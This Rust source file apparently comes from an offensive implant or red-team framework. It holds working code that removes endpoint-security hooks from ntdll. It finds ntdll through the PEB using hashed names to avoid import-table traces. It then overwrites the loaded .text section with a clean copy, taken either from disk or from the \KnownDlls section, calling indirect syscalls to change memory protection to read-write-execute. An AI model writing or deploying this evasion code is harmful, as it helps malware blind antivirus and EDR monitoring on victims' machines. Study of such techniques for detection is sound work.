/// Resolve ntdll base via PEB on x64 (no GetModuleHandleA in IAT).
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn resolve_ntdll_base() -> *mut u8 {
    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
    const NTDLL_H: u32 = djb2_hash_lower(b"ntdll.dll");
    peb_get_module_base(NTDLL_H) as *mut u8
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn resolve_ntdll_base() -> *mut u8 {
    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8
}

#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_disk() -> bool {
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileA, ReadFile, OPEN_EXISTING, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL,
    };
    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, CloseHandle, GENERIC_READ};
    use crate::evasion::syscalls::{get_ssn, indirect_syscall};

    let ntdll_base = resolve_ntdll_base();
    if ntdll_base.is_null() { return false; }

    let path = b"C:\\Windows\\System32\\ntdll.dll\0";
    let h = CreateFileA(
        path.as_ptr(), GENERIC_READ, FILE_SHARE_READ,
        core::ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0,
    );
    if h == INVALID_HANDLE_VALUE { return false; }

    let mut buf = vec![0u8; 0x20_0000];
    let mut bytes_read: u32 = 0;
    ReadFile(h, buf.as_mut_ptr() as _, buf.len() as u32, &mut bytes_read, core::ptr::null_mut());
    CloseHandle(h);

    let disk_ntdll = buf.as_ptr();
    let (text_rva, text_size) = get_text_section(disk_ntdll);
    if text_size == 0 { return false; }

    let target = ntdll_base.add(text_rva);
    let ph = usize::MAX; // -1 = current process

    if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
        let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
        indirect_syscall(prot_ssn, prot_tramp, ph,
            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
            0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
        core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
        let mut base2 = target as usize; let mut sz2 = text_size;
        indirect_syscall(prot_ssn, prot_tramp, ph,
            &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
            old as usize, &mut old as *mut u32 as usize, 0);
    } else {
        core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
    }
    true
}

#[cfg(target_os = "windows")]
pub(crate) unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
    let e_lfanew     = *(base.add(0x3C) as *const u32) as usize;
    let nt           = base.add(e_lfanew);
    let num_sections = *(nt.add(0x06) as *const u16) as usize;
    let opt_size     = *(nt.add(0x14) as *const u16) as usize;
    let sections     = nt.add(0x18 + opt_size) as *const [u8; 40];
    for i in 0..num_sections {
        let sec = &*sections.add(i);
        if &sec[0..5] == b".text" {
            let virt_size = u32::from_le_bytes(sec[16..20].try_into().unwrap()) as usize;
            let virt_rva  = u32::from_le_bytes(sec[12..16].try_into().unwrap()) as usize;
            return (virt_rva, virt_size);
        }
    }
    (0, 0)
}

#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_knowndlls() -> bool {
    use crate::evasion::syscalls::{get_ssn, indirect_syscall, indirect_syscall_10};
    use windows_sys::Win32::Foundation::CloseHandle;

    let ntdll_base = resolve_ntdll_base();
    if ntdll_base.is_null() { return false; }

    let name_buf: [u16; 20] = [
        0x005C,0x004B,0x006E,0x006F,0x0077,0x006E,0x0044,0x006C,0x006C,0x0073,
        0x005C,0x006E,0x0074,0x0064,0x006C,0x006C,0x002E,0x0064,0x006C,0x006C,
    ];

    #[repr(C)]
    struct UnicodeString {
        length:     u16,
        max_length: u16,
        _pad:       u32,
        buffer:     *const u16,
    }
    #[repr(C)]
    struct ObjectAttributes {
        length:        u32,
        root_dir:      usize,
        object_name:   *const UnicodeString,
        attributes:    u32,
        security_desc: usize,
        security_qos:  usize,
    }

    let us = UnicodeString { length: 40, max_length: 40, _pad: 0, buffer: name_buf.as_ptr() };
    let oa = ObjectAttributes {
        length:        core::mem::size_of::<ObjectAttributes>() as u32,
        root_dir:      0,
        object_name:   &us as *const UnicodeString,
        attributes:    0x40,
        security_desc: 0,
        security_qos:  0,
    };

    let Some((open_ssn, open_tramp)) = get_ssn(b"NtOpenSection") else { return false; };
    let mut section_handle: usize = 0;
    let status = indirect_syscall(
        open_ssn, open_tramp,
        &mut section_handle as *mut usize as usize,
        0x0004,
        &oa as *const ObjectAttributes as usize,
        0, 0, 0,
    );
    if status != 0 || section_handle == 0 { return false; }

    let Some((map_ssn, map_tramp)) = get_ssn(b"NtMapViewOfSection") else {
        CloseHandle(section_handle as _); return false;
    };

    let mut base_address: usize = 0;
    let mut view_size: usize = 0;
    let map_status = indirect_syscall_10(
        map_ssn, map_tramp,
        section_handle, usize::MAX,
        &mut base_address as *mut usize as usize,
        0, 0, 0,
        &mut view_size as *mut usize as usize,
        2, 0, 0x02,
    );
    if map_status != 0 || base_address == 0 {
        CloseHandle(section_handle as _); return false;
    }

    let mapped = base_address as *const u8;
    let (text_rva, text_size) = get_text_section(mapped);
    if text_size > 0 {
        let target = ntdll_base.add(text_rva);
        let ph = usize::MAX;
        if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
            let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
                0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
            core::ptr::copy_nonoverlapping(mapped.add(text_rva), target, text_size);
            let mut base2 = target as usize; let mut sz2 = text_size;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
                old as usize, &mut old as *mut u32 as usize, 0);
        } else {
            core::ptr::copy_nonoverlapping(mapped.add(text_rva), target, text_size);
        }
    }

    if let Some((unmap_ssn, unmap_tramp)) = get_ssn(b"NtUnmapViewOfSection") {
        indirect_syscall(unmap_ssn, unmap_tramp, usize::MAX, base_address, 0, 0, 0, 0);
    }
    CloseHandle(section_handle as _);
    text_size > 0
}
